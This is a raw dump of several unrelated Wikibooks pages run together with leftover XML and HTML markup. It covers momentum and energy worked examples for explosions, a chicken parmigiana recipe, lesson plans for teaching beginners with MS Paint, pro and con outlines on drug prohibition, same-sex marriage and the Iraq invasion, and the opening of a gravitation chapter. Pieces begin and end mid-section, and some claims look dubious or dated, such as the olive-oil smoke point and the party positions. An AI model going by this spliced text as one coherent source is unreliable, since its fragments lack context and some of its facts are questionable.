Now we know that ''m''&lt;sub&gt;1&lt;/sub&gt;= 5 kg but we do not know what the mass of ''m''&lt;sub&gt;2&lt;/sub&gt; is. However, we do know that:

&lt;center&gt;&lt;math&gt;\begin{matrix}m_{Tot} &amp;=&amp; m_1+m_2 \\m_2 &amp; =&amp; m_{Tot} -m_1 \\&amp;=&amp;15 \rm {\ kg}-5 \rm {\ kg} \\&amp;=&amp;10 \rm {\ kg}\end{matrix}&lt;/math&gt;&lt;/center&gt;

Step 5 : 

Now we can substitute all the values we know into equation (A) and solve for &lt;math&gt;\overrightarrow{v_{2}}&lt;/math&gt;. Let's choose the positive ''x''-direction to have a postive sign and the negative ''x''-direction to have a negative sign:

&lt;center&gt;&lt;math&gt;\begin{matrix}0 &amp;=&amp; m_{1}\overrightarrow{v_{1}} + m_{2}\overrightarrow{v_{2}} \rm {\qquad (\textbf{A})} \\0 &amp;=&amp; 5(7) + 10(\overrightarrow{v_{2}}) \\0 &amp;=&amp; 35 + 10(\overrightarrow{v_{2}}) \\10(\overrightarrow{v_{2}}) &amp;=&amp; -35 \\\overrightarrow{v_{2}} &amp;=&amp; -3.5 \rm {\ \mathrm{m.s^{-1}}}\end{matrix}&lt;/math&gt;&lt;/center&gt;

Therefore,

&lt;center&gt;&lt;math&gt;\begin{matrix}\overrightarrow{v_{2}} = \underline{3.5 \ \mathrm{m.s^{-1}}\rm {\ in \ the \ negative \ x-direction.} }\end{matrix}&lt;/math&gt;&lt;/center&gt;</text>

= Explosions: Energy and Heat =

In explosions, you have seen that kinetic energy is not conserved. But remember that total energy is always conserved. Let's
look at what happens to the energy in some more detail. If a given amount of energy is released in an explosion it is not
necessarily all transformed into kinetic energy. Due to the deformation of the exploding object, often
a large amount of the energy is used to break chemical bonds and heat up the pieces.

Energy is conserved but some of it is transferred through non-conservative processes like heating. This just means that we
cannot get the energy back. It will be radiated into the environment as heat energy but it is all still accounted for.

Now we can start to mix the ideas of momentum conservation with energy transfer to make longer problems. These problems are
not more complicated just longer. We will start off short and then combine the different ideas later on.

&lt;blockquote style=&quot;background: white; border: 1px solid black; padding: 1em;&quot;&gt;
Long problems should be treated like a number of smaller problems. Focus on them one at a time.
&lt;/blockquote&gt;

==Worked Example 51 Energy Accounting 1==

'''Question:''' An object with a mass of ''m''&lt;sub&gt;t&lt;/sub&gt; = 17 kg explodes into two pieces of mass ''m''&lt;sub&gt;1&lt;/sub&gt; = 7 kg and ''m''&lt;sub&gt;2&lt;/sub&gt; = 10 kg; ''m''&lt;sub&gt;1&lt;/sub&gt; has a velocity of 9 m·s&lt;sup&gt;-1&lt;/sup&gt; in the negative ''x''-direction and ''m''&lt;sub&gt;2&lt;/sub&gt; has a velocity of 
6.3 m·s&lt;sup&gt;-1&lt;/sup&gt; in the positive ''x''-direction. If the explosion released a total energy of 2000 J, how much was used in a non-conservative way? 

'''Answer:'''

Step 1 : 

Draw the picture. &lt;u&gt;Before&lt;/u&gt; the collision:

'''Riaan Note: first image on page 157 is missing '''

[[Image:Fhsst_expl19.png|372px|]]

&lt;u&gt;After&lt;/u&gt; the collision:

[[Image:Fhsst_expl20.png|372px|]]


Step 2 : 

We are asked how much energy was used in a non-conservative fashion. This is the difference between how much energy was used in a conservative fashion and how much was used in total. We are lucky because we have everything we need to determine the kinetic energy of both pieces. The kinetic energy of the pieces is energy that was used in a conservative way.

Step 3 : 

The sum of the kinetic energy for the two blocks is the total kinetic energy of the pieces. So:

&lt;center&gt;&lt;math&gt;\begin{matrix}E_{kTot} &amp;=&amp; E_{k1} + E_{k2} \\&amp;=&amp; \frac{1}{2}m_{1}\overrightarrow{v_{1}}^{2} +\frac{1}{2}m_{2}\overrightarrow{v_{2}}^{2} \\&amp;=&amp; \frac{1}{2}(7)(9)^{2} + \frac{1}{2}(10)(6.3)^{2} \\&amp;=&amp; 283.5 + 198.45 \\E_{kTot} &amp;=&amp; 481.95 \rm {\ J}\end{matrix}&lt;/math&gt;&lt;/center&gt;

Step 4 : 

The total energy that was transformed into kinetic energy is 481.95 J. We know that 2000 J of energy were released in total. the
question makes no statements about other types of energy so we can assume that the difference was lost in a non-conservative
way. Thus the total energy lost in non-conservative work is:

&lt;center&gt;&lt;math&gt;\begin{matrix}E - E_{kTot} &amp;=&amp; 2000 - 481.95 \\&amp;=&amp; 1518.05 \rm {\ J}\end{matrix}&lt;/math&gt;&lt;/center&gt;

==Worked Example 52 Energy Accounting 2==

'''Question:''' An object at rest, with mass ''m''&lt;sub&gt;Tot&lt;/sub&gt; = 4 kg, explodes into two pieces (''m''&lt;sub&gt;1&lt;/sub&gt;, ''m''&lt;sub&gt;2&lt;/sub&gt;) with ''m''&lt;sub&gt;1&lt;/sub&gt; = 2.3 kg. ''m''&lt;sub&gt;1&lt;/sub&gt; has a
velocity of 17 m·s&lt;sup&gt;&amp;minus;1&lt;/sup&gt; in the negative ''x''-direction. If the explosion released a total energy of 800 J, 

# What is the velocity of ''m''&lt;sub&gt;2&lt;/sub&gt;?
# How much energy does it carry?
# And how much energy was used in a non-conservative way?

'''Answer:'''

Step 1 : 

Draw the picture. &lt;u&gt;Before&lt;/u&gt; the collision:

[[Image:Fhsst_expl21.png|372px|]]

&lt;u&gt;After&lt;/u&gt; the collision:

[[Image:Fhsst_expl22.png|372px|]]

Step 2 : 

Now we know that in an explosion, total kinetic energy is not conserved. There is a definite change in shape of the exploding
object! But we can always use momentum conservation to solve the problem. So:

&lt;center&gt;&lt;math&gt;\begin{matrix}\overrightarrow{p_{Before}} &amp;=&amp; \overrightarrow{p_{After}} \\\overrightarrow{p_{Before}} &amp;=&amp; \overrightarrow{p_{1}} + \overrightarrow{p_{2}}\end{matrix}&lt;/math&gt;&lt;/center&gt;

But the object was initially at rest so:

&lt;center&gt;&lt;math&gt;\begin{matrix}0 &amp;=&amp; \overrightarrow{p_{1}} + \overrightarrow{p_{2}}\\0 &amp;=&amp; m_{1}\overrightarrow{v_{1}} + m_{2}\overrightarrow{v_{2}} \rm {\qquad (\textbf{A})}\end{matrix}&lt;/math&gt;&lt;/center&gt;

Step 3 : 

Now we know that ''m''&lt;sub&gt;1&lt;/sub&gt;= 2.3 kg but we do not know what the mass of ''m''&lt;sub&gt;2&lt;/sub&gt; is. However, we do know that:

&lt;center&gt;&lt;math&gt;\begin{matrix}m_{Tot} &amp;=&amp; m_1+m_2 \\m_2 &amp; =&amp; m_{Tot} -m_1 \\&amp;=&amp;4 \rm {\ kg}-2.3 \rm {\ kg} \\&amp;=&amp;1.7 \rm {\ kg}\end{matrix}&lt;/math&gt;&lt;/center&gt;

Step 4 : 

Now we can substitute all the values we know into equation (A) and solve for &lt;math&gt;\overrightarrow{v_{2}}&lt;/math&gt;. Let's 
choose the positive ''x''-direction to have a postive sign and the negative ''x''-direction to have a negative sign:

&lt;center&gt;&lt;math&gt;\begin{matrix}0 &amp;=&amp; m_{1}\overrightarrow{v_{1}} + m_{2}\overrightarrow{v_{2}} \rm {\qquad  (\textbf{A})} \\0 &amp;=&amp; (2.3)(-17) + 1.7\overrightarrow{v_{2}}\\0 &amp;=&amp; -39.1 + 1.7\overrightarrow{v_{2}}\\1.7\overrightarrow{v_{2}} &amp;=&amp; 39.1 \\\overrightarrow{v_{2}} &amp;=&amp; 23 \rm {\ \mathrm{m.s^{-1}}}\end{matrix}&lt;/math&gt;&lt;/center&gt;


* &lt;math&gt;\overrightarrow{v_{2}} = 23 \mathrm{m.s^{-1}}&lt;/math&gt; in the positive x-direction
Step 5 : 

Now we need to calculate the energy that the second piece carries:

&lt;center&gt;&lt;math&gt;\begin{matrix}E_{k2} &amp;=&amp; \frac{1}{2}m_{2}\overrightarrow{v_{2}}^{2}\\&amp;=&amp; \frac{1}{2}(1.7)(23)^2 \\&amp;=&amp; 449.65 \rm {\ J}\end{matrix}&lt;/math&gt;&lt;/center&gt;

* The kinetic energy of the second piece is &lt;math&gt;E_{k2}=449.65 J&lt;/math&gt;  

Step 6 : 

Now the amount of energy used in a non-conservative way in the explosion, is the difference between the amount of energy released in
the explosion and the total kinetic energy of the exploded pieces:

&lt;center&gt;&lt;math&gt;\begin{matrix}E - E_{kTot} &amp;=&amp; 800 - E_{kTot} \\\end{matrix}&lt;/math&gt;&lt;/center&gt;

We know that:

&lt;center&gt;&lt;math&gt;\begin{matrix}E_{kTot} &amp;=&amp; E_{k1} + E_{k2} \\&amp;=&amp; \frac{1}{2}m_{1}\overrightarrow{v_{1}}^{2} + 449.65 \\&amp;=&amp; \frac{1}{2}(2.3)(17)^{2} + 449.65 \\&amp;=&amp; 332.35 + 449.65 \\&amp;=&amp; 782 \rm {\ J}\end{matrix}&lt;/math&gt;&lt;/center&gt;

Step 7 : 

So going back to:

&lt;center&gt;&lt;math&gt;\begin{matrix}E - E_{kTot} &amp;=&amp; 800 - E_{kTot} \\&amp;=&amp; 800 - 782 \\&amp;=&amp; 18 \rm {\ J}\end{matrix}&lt;/math&gt;&lt;/center&gt;

* &lt;u&gt;18 J of energy was used in a non-conservative way in the explosion&lt;/u&gt;</text>

{{recipe}} | [[Cookbook:Cuisine of Italy|Italian Cuisine]] | [[Cookbook:Cuisine of the United States|US Cuisine]]

'''Chicken Parmigiana''' is a popular [[Cookbook:Cuisine of Italy|Italian]]-[[Cookbook:Cuisine of the United States|American]] dish served in a variety of ways.  The same basic recipe works for a number of dishes.  The components usually consists of a breaded, tenderized piece of [[Cookbook:Meat|meat]] (or slice of [[Cookbook:Eggplant|eggplant]]), a simple [[Cookbook:Marinara Sauce|marinara sauce]], and [[Cookbook:Cheese|cheese]] (usually [[Cookbook:Mozzarella Cheese|mozzarella]]).  A thicker [[Cookbook:Pasta|pasta]], such as linguini, a toasted loaf of Italian [[Cookbook:Bread|bread]], and a light red wine such as Chianti complement this dish well.

This recipe is typical of the parmigiana recipes from New York and New Jersey.

==Ingredients==
* 2 [[Cookbook:Chicken|chicken]] breasts
* 1 [[Cookbook:Teaspoon|teaspoon]] of [[Cookbook:Salt|salt]]
* 1 teaspoon of [[Cookbook:Garlic|garlic]] powder
* 1/2 a teaspoon of dried [[Cookbook:Oregano|oregano]]
* 1/4 teaspoon of dried [[Cookbook:Basil|basil]]
* 1/4 teaspoon of finely crushed [[Cookbook:Pepper|black pepper]]
* 1/2 a [[Cookbook:Cup|cup]] of All-Purpose [[Cookbook:Flour|flour]]
* 1/2 a cup of [[Cookbook:Tomato Paste|tomato puree]]
* 1/4 cup of [[Cookbook:Chicken|chicken]] [[Cookbook:Stock|stock]]
* 1/2 a cup of [[Cookbook:Canola Oil|canola oil]] (see below if you wish to use [[Cookbook:Olive Oil|olive oil]])
* 1/2 a cup of shredded [[Cookbook:Mozzarella Cheese|mozzarella cheese]]
* 1/4 a cup of grated [[Cookbook:Parmesan Cheese|parmigiano cheese]]

==Preparation==
#In a heavy [[Cookbook:Skillet|skillet]] (preferably cast iron), heat the oil on medium heat.
#While the oil is heating, use a tenderizing mallet (or the ball of your hand) to pound the chicken breasts to about 1/2 an [[Cookbook:Inch|inch]] of thickness.  This step is important to ensure the chicken is tender and more importantly to ensure the chicken cooks thoroughly.
# Season the chicken breasts with salt and garlic powder.
# [[Cookbook:Dredging|Dredge]] the breasts in flour and shake off any excess.
# Place both breasts in the heated oil for 3 minutes, then flip and [[Cookbook:Frying|fry]] for an additional 2 minutes.
# Remove the breasts and place on a rack or paper towel.
# Turn on an [[Cookbook:Oven|oven]], set for [[Cookbook:Broiling|broiling]].
# In a large oven-safe [[Cookbook:Saucepan|sauce pan]], heat the tomato puree and chicken stock until it begins to [[Cookbook:Simmer|simmer]].
# Add the oregano, basil, and pepper to sauce pan and mix
# Place cooked chicken breasts in pan and flip a number of times to coat with sauce.
# Add mozzarella and parmigiana cheese to the tops of the breasts.
# Place in oven for 30-60 seconds.  It will burn very quickly so check it frequently.
# Remove from oven and serve.

==Tips==
* Use thin-sliced chicken cutlets (available at most supermarkets) to avoid the BIG mess and time of pounding.
* If pasta is to be served with this meal, it should be timed so that the parmigiana is done right when the pasta is.  The pasta should be removed directly from the pot and placed into the pan.  The remaining sauce can then be used with the pasta.
* This recipe works best with breasts that come from slightly older chickens (such as broiler or fryer chickens).  These chickens have a stronger taste but are generally tougher.  The tenderizing step takes care of the toughness of the older birds though.
* If you do not live in area where fresh tomatoes are grown, canned tomatoes are usually superior to the low-cost ones you will find in the super market.
* Tomato puree goes bad very quickly (even in the fridge).  Freezing the tomato puree in chunks allows for long-term storage.

==Variations and Varieties==
* For [[Cookbook:Veal|veal]] parmigiana, follow the same steps except do not tenderize.  Veal is already tender enough.  The veal can also be cooked for 2 minutes on each side.
* Omit the tenderizing step for [[Cookbook:Eggplant|eggplant]] parmigiana.
* If you want to use fresh garlic instead of powder, add it to the sauce instead of adding it to the chicken breast.
* You can also try using other types of [[Cookbook:Cuisine of Italy|Italian]] [[Cookbook:Cheese|cheeses]] such as [[Cookbook:Provolone Cheese|provolone cheese]] or [[Cookbook:Fontina Cheese|fontina cheese]] to add more of a &quot;tasty kick&quot; compared to a mild cheese like mozzarella 
* You may wish to use [[Cookbook:Olive Oil|olive oil]]. When frying with olive oil, be sure to use a cheap solvent-extracted grade! The fancy grades can not tolerate heat. They have [[Cookbook:Smoke Point|smoke points]] as low as 200°F (93°C), making for both a fire hazard and a source of cancer-causing fumes. Save the cold-pressed extra-virgin olive oil for a [[Cookbook:Salad|salad]].

{{book title|Teaching Computer Literacy|From the Beginning}}

This is a resource for anyone who is, or will be teaching the basics of computers to any type of beginner. 
The focus of this book is to provide:
*General suggestions that can be adapted to your needs.
*Specific lesson plans for students with varying interests. 
*Links to other relevant information 
*Links to useful software for the purpose of learning or teaching.

Currently we have &quot;Lessons in Paint&quot; which are good for most children, and anyone else who likes to draw. Lessons in Paint is great because many of the Windows features are teachable in Paint.

These lessons are geared toward Windows PCs. The suggestions and lessons could be adapted to work with other operating systems. If you have or make a lesson plan around Mac or Linux, please let us know on the discussion page and we could create a place for it.

Remember, you can edit or add information by simply clicking on the “edit” tab at the top of any page or any section. Don’t worry about mistakes, you will be able to preview before saving. Also other users of can refer to previous versions and fix mistakes. If you are interested in the development of this book click on the “discussion” tab on any page to see what we are working on, and to contribute to the discussion.

*spell check

= Overall Suggestions =
Some obvious and hopefully some not so obvious suggestions;
It is important to make it interesting for the specific person, while keeping it simple enough to avoid frustration. To achieve both goals at the same time you should;
#Ask them what they want to do. 
#Find the simplest method of accomplishing the task. 
#Try it a few times to simplify the process and organize your lesson.
#Then walk them through the lesson.

At first skip the start menu by using a desktop shortcut. Yes they will need to learn it, but getting straight to something useful is key to avoiding frustration.

Use 800x600 screen resolution for improved visibility and mouse accuracy.

Change the mouse sensitivity to be easier to control.

Use only click, and drag on the first lesson.

Choose the save to directory and make sure you are viewing with thumbnails.

Teach the menu from left to right, i.e. start with 'file' on the first day then 'edit' the next. This should prevent having too many students unsure which menu item to click.

Note that similar things can be taught together when they are done in the same way. Like dragging a window and dragging a pasted item. However when two different things could be confusingly similar, teach them at different times, and teach the distinction when teaching the second. Some examples of this; the menu items, click/double click, and save/save-as.

Use consistent language, and find the easiest term to relate too. Students will learn the synonyms later without even realizing they are learning. Here are a few examples

Arrow, pointer, curser, mouse (I prefer arrow, pointer works well also).
Enter, or return (use whatever is written on the key, and stick with it).

In the first few sessions avoid button combinations of any kind. Using Ctrl C to copy is faster, and easier, but not for those new to computers. Even Shift key for capital letters is potentially frustrating. Introduce these combinations after your students are good at computers.

= '''Lessons in Paint''' =

In this series of lessons we use Microsoft Paint. This is a good program to use; it is already on the computer, is fun to use, and is great practice for the mouse. You can teach most of the basics using Paint.

== Paint Lesson 1 ==
Open MS Paint


First you setup the computer;
*Change the screen resolution to 800 x 600.
*Choose the location for saving files.
*Set to view files as thumbnails.
*Change the mouse settings to be less sensitive.
(This will help students who are new to using the mouse, making it easier to select things.)
*Next you put an icon of the Paint program on the desktop.

The students will be learning how to click, drag, and point the mouse. To avoid overwhelming the student we will focus on just those 3 things. We will cover double click, and right click in another lesson. We will also want to focus on only things that can be done when pressing one button at a time. An example is shift key for caps; you should consider not using caps, or using the caps lock. 

===Mini Lesson #1===
#Show how to select the icon and hit enter to open (not double clicking).
#Have them click on the line tool.
#Show how to drag to make a line.
#Demonstrate picking a color from the palette.
#Show the circle tool (ellipse tool).
#Let them have fun.
Watch for anyone having trouble, and be ready to answer any questions.

Next we show how to save;
#Click on file.
#Click save.
#Choose a name.
#Type it in.
#Click save.
#Show how to close the Window (using the X).

Congratulate everyone on completing the first (mini) lesson.

===Mini lesson #2===

Have everyone start again, on their own as much as possible.
Show the pencil tool and have the students see what all the tools below it do.
*spray paint (airbrush)
*line
*rectangle
*oval (ellipse)
Kids can easily remember these tools because the icons have simple representations of what the tool does.

Tell the students they can draw a picture for the computer. This will give you some time to help and reassure those who need it.
#make sure everyone has saved their picture
#click on 'file'
#click on 'save as background image centered'

Now their work of art is the center of attention on the computer. This should bring their focus from the paint program to other parts of the computer.

== Paint Lesson 2 ==
Check the settings are suitable to your needs, just as in Paint Lesson 1. 

#Have everyone open Paint by double clicking on the icon. 
#Show the Brush and demonstrate the options (shapes and sizes).
#Have the students draw with the diagonal brush so they can see the ribbon effect.
#Explain how most tools have options in the same place.
#Let them look at the tools and options and try them out.
You might have them find how many don't have options (pencil, fill tool, eyedropper). Let the students get comfortable using them to see what happens. 

Most of the options are related to size making it easier to understand.

For now we will move on to explain edit options starting with undo.
#Show how to undo from the edit menu and let everyone practice.
#Show how it will only go back 3 times.
#Demonstrate redo, and how it is the opposite of undo.

End the lesson by having everyone save their pictures and make it the background image.

==Paint Lesson 3==
You should begin by teaching anything you may have skipped in from the past lessons. Next you should cover the text tool

      <text xml:space="preserve">[[wikipedia:en:Drug prohibition|Drug prohibition]] is a set of policies which outlaw the possession, use, manufacture and/or distribution of drugs.  In most countries, prohibited drugs include heroin, cocaine, marijuana and LSD.

:'''Supporters''' believe that drug prohibition is a morally acceptable and/or efficacious way to reduce drug abuse
:'''Opponents''' believe drug prohibition is a morally unacceptable and/or ineffective way to reduce drug abuse

Both of these positions rely on the premise that drug abuse is harmful to the individual abusers and/or society in general.

==Arguments in support==

===Crime===

Drug prohibition reduces the rates of drug addiction and thus reduces drug-related crime such as robbery.

:''This argument relies on the assumption that drug prohibition has reduced drug abuse.''
:''This argument relies on the assumption that drug addiction causes crime drug abuse.''

===Marketing===

Legalized drugs would be sold by large corporations that may use irresponsible advertising to encourage risky and addictive behaviors.

====Counterpoint====

Prohibited drugs are currently sold by black market distributors who do not monitor purity and resort to outright violence in trade disputes, in addition to promoting their product to non-users.  Corporations could be more easily held to standards of purity and ethical conduct than a vast network of black market distributors.

====Socialist view====

Legalized drugs could be produced and managed by the state and done in such a manner as to eliminate advertising and reduce overall use.

===Protect individuals===

Drug abuse causes harm to the individuals and their family and friends, and society in general.  It is the responsibility of the government to prevent that.
:''This argument relies on the premise that drug abuse is harmful to the individual abusers and/or society in general.''
:''This argument relies on the premise that the government has the right and responsibility to limit individual rights in this case.''
:''This argument relies on the assumption that drug prohibition has reduced drug abuse.''

===Setting an example===

Allowing the legal use of drugs like heroin and cocaine will provide a negative role model for children and thus cause an increase in drug abuse.
:''This argument relies on the factual claim that legalizing drugs will cause an increase in drug abuse.''

==Argument in opposition==

===Black Market===
''[[wikipedia:en:Black Market|Black Market]]'': the trade in prohibited goods

Much of the harm caused by drug abuse comes from the unregulated market for drugs.  There is no legal incentive for manufacturers and distributors to ensure the safety of their product or rely on honest, peaceful transactions with customers and rivals.  If drugs were legalized, this black market would disappear, reducing the funding considerably for organized crime including terrorism, Mafia and street gangs.

:''This argument relies on the claim that organized crime is funded by the drug trade.''

===Drug costs===

Legalizing drugs would drastically reduce their cost.  Thus, addicts could afford their habit without resorting to violence and robbery.

===Efficacy===

Because drug prohibition has not proven effective in reducing the rate of drug abuse, it is time to try a different approach, such as a wide variety of harm reduction proposals.

:''This argument relies on the claim that drug prohibition has not reduced drug abuse rates.

===Personal freedom===

The government does not have the right to limit a person's choices regarding drug use.

===Racism===
Drug prohibition was founded based on racism, and remains racist in practice.

:''This argument relies on the premise that drug prohibition policies are racist in implementation and design.''

===Tax revenue===

Legalizing drugs would grant a major new stream of tax revenue for the government.

      <text xml:space="preserve">==Policies==

===Federal Marriage Amendment===
''Wikipedia article: [[wikipedia:en:Federal Marriage Amendment|Federal Marriage Amendment]]''

The Federal Marriage Amendment is a proposed [[wikipedia:en:Constitutional amendment|Amendment to the United States Constitution]] that would legislate the nature of marriage, so that it is limited to occurring between one man and one woman.  The Amendment would override any state law that contradicts it, and could be changed only through the passage of another Amendment.

The Federal Marriage Amendment is generally supported more by the Republican Party.  Nevertheless, there are Democrats and member of other leftist parties who also support it, as well as Republicans and other rightist parties who do not.  Opposition can be inspired either by a belief that same-sex marriage should be allowed, or by a philosophy that the Amendment would needlessly overrule states rights.

Those who believe in states rights on the same-sex marriage issue do so on the principle that the populations of individual states should be allowed to organize their society and culture in whatever way fits their ideals and morals.  One potentially divisive issue, however, is whether other states and communities must recognize same-sex marriages performed elsewhere.  According to the US Constitution's [[wikipedia:en:Full Faith and Credit clause|Full Faith and Credit clause]], marriages performed legally in one state must be recognized throughout the nation.  The [[wikipedia:en:Defense of Marriage Act|Defense of Marriage Act]], a bill signed into law in 1996 by Democratic President [[wikipedia:en:Bill Clinton|Bill Clinton]], explicitly grants states the right to refuse to recognize same-sex marriages.  Some of the support for the Federal Marriage Amendment comes from those who believe that the Defense of Marriage Act is unconstitutional because it grants an exception to the full faith and credit clause.

Some opponents of the Federal Marriage Amendment have pointed out that the Amendment would be the only binding Amendment to limit the freedom of citizens.  The [[wikipedia:en:18th Amendment to the United States Constitution|18th Amendment]], which banned alcohol during [[wikipedia:en:Prohibition|Prohibition]], was also passed, but has been repealed by the [[wikipedia:en:21st Amendment to the United States Constitution|21st Amendment]].  The [[wikipedia:en:Twenty-second Amendment to the United States Constitution|22nd]] and [[wikipedia:en:Sixteenth Amendment to the Constitution|16th Amendment]] could also be seen as curtailing freedoms in establishing a two-term limit for Presidents and instituting a graduated [[wikipedia:en:Income tax|income tax]], respectively.

===Civil unions===
''Wikipedia article: [[wikipedia:en:Civil union|Civil Union]]

The state of Vermont does not allow same-sex marriages, but does allow same-sex &quot;civil unions&quot;.  These grant most of the same rights as marriage.  Opposition to civil unions occurs from both Supporters and Opponents; Supporters believe it is a form of &quot;second-class citizenship&quot; (that is, discrimination) and Opponents believe it is, for all intents and purposes, equivalent to marriage and is opposable on the same grounds.  Those who support civil unions include Opponents who object to same-sex marriage on traditional grounds&amp;mdash;that ''marriage'' is a heterosexual institution by definition, but that same-sex couples should be able to receive the same benefits for their own unions&amp;mdash;and Supporters who believe that civil unions are practically identical to marriage.

==Discrimination==

'''Supporters:''' The refusal to extend marriage to homosexual couples is inherently unfairly discriminatory and a violation of the [[wikipedia:en:Fourteenth Amendment to the United States Constitution|14th Amendment]], which guarantees equal treatment under the law.  There are more than 1,000 laws which apply differently depending on an individual's marital status.  These extend from trivial facts, such as that a gay president's lover would not be protected by the Secret Service, to complex issues concerning the release of financial and medical information, hospital visitation rights, taxes, wills, child custody, alimony, and Fifth Amendment rights.

'''Opponents:''' The 14th Amendment does not apply because a person's homosexual behavior is a choice.  The government is not obliged to recognize all choices as of equal validity. (''This is part of the [[wikipedia:en:Nature versus nurture|nature vs. nurture debate]].'')

===Libertarian View===

The United States Libertarian Party, and some persons from Democratic, Republican, other, or no parties, have an opinion different from both Supporters and non-Supporters.

'''Libertarians:''' The government has no authority to recognize any marriage.  There are over 1,000 legal rights granted to heterosexual couples should not be granted. For example, the tax code should not treat married couples differently than unmarried couples.  The government should not compel hospitals to allow any individual access to patients or medical records, except in accordance with that hospital's policy.  Individuals can choose to cohabitate, and can declare themselves married, or perform a ceremony.  It is up to individuals to choose, according to their own beliefs, whether to recognize any such marriage.

==Views==

===Parties===

*[[Voter's Guide/United States/Democratic Party|Democratic Party]]: Opposed to same-sex marriage but in favor of civil unions
*[[Voter's Guide/United States/Republican Party|Republican Party]]: Opposed to same-sex marriage and civil unions
*[[Voter's Guide/United States/Green Party|Green Party]]: Supports same-sex marriage
*[[Voter's Guide/United States/Libertarian Party|Libertarian Party]]: Supports the Libertarian View (see above)

      <text xml:space="preserve">===== This wikibook needs your help with; =====
*Teaching tips even basic ones.
*Lesson plans/lesson outlines.
*Organizing the information.
*Changing to multiple pages at some point.
*Corrections to grammar spelling etc.
*Links to good software (preferably free).
===== A little more about me and this project =====
I'm Eric, and I started this wikibook because I've offered to volunteer teaching computer classes. Classes should start when school is out. They are still cutting through the red tape, and I am not sure if I will get the chance. I didn't realize that non-profit organizations had so much red tape. Anyway I practiced the lessons with my nephews 7 and 4 years old. But they are already familiar with a mouse, hopefully it doesn't skew my test results too much.

I tried to find some public domain material on the subject but came up with nothing, and so this book was started. I started with paint because I know it well. It does keep the interest of kids. As a native windows program you can teach some windows fundamentals. Simplified kids software is great but you can't teach what isn't there.

The organization I've offered to volunteer for says they have Microsoft Office. So far I'm not sure what is going to get teenagers interested in Microsoft Office. Any ideas please click 'edit this page'. Thanks for taking the time to read this, hopefully you find this book useful.

== A few comments ==
1) I think we should either rename the article or perhaps expand its scope to non-windows machines.
2) I hope to make some of my own contributions, and maybe expand this beyond paint.
3) Is this really a worthwhile book? There are other, much more complete books on the same topic.
4) Anyone else still interested?

==== Wordpad ====
My name is Hall, I'm a computer teacher for both primary and secondary schools. I have found that Wordpad is a great program to teach beginners about word processing, keyboard skills and file management. The interface in wordpad is like a cutdown version of MSWord (without going to the trouble of customising the MS word interface), which helps the student focus on key skills, reduces choice/mistake anxiety, and helps the transition to a &quot;real&quot; Word Pocessor. I have about 3 lessons written up (if I can find them). If Eric wants to set up the chapters I'll paste them in.

== Setting up Wordpad lessons ==

I would be glad to set up the Wordpad lesson. You can leave what you have in this talk page. Thanks, Eric

== Timing ==
A helpful element for this book would be suggested/expected time that the lessons would take. I might offer this myself after trying some of it out today at a primary school in Newtown, Basseterre, St. Kitts today.

== Not Paint, but WORD or rtf ==

The subject is presented well, but I teach Senior Citizens! I therefore prefer a TEXT program to start with, such as WORD since that makes immediate connection to the SC students.
Easy to start them off with typing their life history for their grandchildren. Alternately, start them playing card games, which they often already know, but gives them plenty of opportunity to use the mouse, especially at home away from the classroom.</text>

      <comment>/* Humanitarian principles */ fixed link</comment>
      <text xml:space="preserve">The US-led coalition invaded Iraq and are occupying it.  There are two broad areas of dispute:
:The evidence that an attack was necessary
:The handling of the invasion and subsequent occupation

==Justification for the attack==

===International Law===
*According to international law, an attack on another country is illegal unless approved by the security council.  The USA was unable to provide this approval.  

*The USA frequently condemn the military actions of other countries when they act without security council approval.  Failing to lead by example will diminish the USA's credibility in the eyes of other countries as a law abiding moral state.

===Humanitarian principles===

*[[wikipedia:en:Saddam Hussein|Saddam Hussein]] was a tyrant who ruled over Iraq with a reign of terror and murder, committing acts that amount to [[wikipedia:en:genocide|genocide]].  Therefore, invading Iraq to install a more peaceful regime was an act of kindness and benevolence.

:''This argument relies on the [[../Murder|premise that murder is]] wrong.''
:''This argument relies on the premise that democracy is morally superior to tyrannical regimes.''
:''This argument relies on the claim that the government of Saddam Hussein was murderous and dictatorial.''
:''This argument relies on the claim that the invasion is not murder itself:  See War is murder.

====Counterpoint====

*Many governments in the world are dictatorial and sometimes even genocidal.  Saddam Hussein's capacity to harm both his own people and his neighbors was so severely harmed by UN sanctions that he posed little threat to anyone, and was in any case less dangerous than many other dictators around the world.  Thus, the invasion was not warranted because other countries represented a bigger threat to world peace and stability.

:''This argument relies on the [[../Human Rights|premise that there are extant governments that routinely violate]] human rights.''
:''This argument relies on the premise that UN sanctions on Iraq worked to reduce Saddam Hussein's military capacity and threat to the world.

===Iminent threat===

*The invasion of Iraq was warranted because Iraq posed an imminent threat to the safety and well-being of the United States and other countries.

:''This argument relies on the premise that Saddam Hussein's government represented a threat to world peace.''
:''This argument relies on the premise that the safety and well-being of the United States and other countries are important.''

===Aid to al-Qaeda===

*Saddam Hussein had ties to [[wikipedia:en:al-Qaeda|al-Qaeda]], a [[wikipedia:en:terrorist|terrorist]] organization that threatened the United States and other countries and has masterminded several major terrorist attacks.

:''This argument relies on the claim that Saddam Hussein's government had ties to al-Qaeda.
:''This argument relies on the claim that terrorism, and al-Qaeda specifically, remains a major threat to peace in the United States and other countries.''

====Weapons of Mass Destruction====

*Saddam Hussein represented a threat because he had [[wikipedia:en:Weapon of Mass Destruction|Weapons of Mass Destruction]], or had the desire and ability to acquire them.

:''This argument relies on the premise that Iraq was in possession of Weapons of Mass Destruction.
:''This argument relies on the premise that Iraq had no right to possess Weapons of Mass Destruction.

===Middle-Eastern stability===

===Oil===

==Execution of invasion and occupation==

===Civilian casualties===

===Insurgency===

===Predictions===

= Newtonian Gravitation =
[[Image:GodfreyKneller-IsaacNewton-1689.jpg|thumb|right|Sir Isaac Newton]]
All objects on Earth are pulled downward, towards the ground. This phenomenon is called '''gravity'''. Every object falls just as fast as any other object (unless the air slows it down like a feather, or pushes it up like a balloon), as first shown by [http://en.wikipedia.org/wiki/Galileo Galileo].
In 1687 [http://en.wikipedia.org/wiki/Isaac_Newton Isaac Newton] stated that gravity is not restricted to the Earth, but instead, there is gravity everywhere in the universe. Newton explained that planets, moons, and comets move in orbits because of the effect of gravity.</text>

= Properties =

Gravitational attraction is a force and therefore must be described by a vector - so remember magnitude and direction.
The force due to gravity acts between ''any'' two objects with mass. To determine the magnitude of the force we use the following equation:

{| 
|-
|&lt;math&gt;\begin{matrix}F = \frac{G m_1 m_2}{r^2}\end{matrix}&lt;/math&gt;
| class=&quot;eqno&quot; align=&quot;RIGHT&quot; |    (9.1)

